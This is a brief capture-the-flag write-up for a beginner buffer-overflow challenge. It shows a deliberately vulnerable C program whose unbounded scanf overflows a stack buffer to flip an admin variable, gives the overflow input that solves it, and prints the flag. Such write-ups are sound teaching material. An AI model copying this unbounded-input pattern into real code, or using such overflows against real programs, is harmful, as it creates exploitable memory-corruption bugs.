# bof1

## Pwn that buffer!

Both a binary and a C source file were given.

```
#include <stdio.h>
#include <stdlib.h>

void win(void) {
	char flag[64];
	
	FILE* fp = fopen("flag.txt", "r");
	if(!fp) {
		puts("error, contact admin");
		exit(0);
	}
	
	fgets(flag, sizeof(flag), fp);
	fclose(fp);
	puts(flag);
}

int main(void) {
	int admin = 0;
	char buf[32];
	
	scanf("%s", buf);
	
	if(admin) {
		win();
	}
	else {
		puts("nope!");
	}
	
	return 0;
}
```
To capture the flag, we need to change the value of ```admin``` which is stored on the stack. Thankfully, ```scanf()``` does not check for the size of the input, so we can just overflow the buffer, which is also stored on the stack, using a string longer than 32 characters.

**Solution**
```
./bof1 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

**Flag**
```
flag{my_first_buffer_overflow!}
```
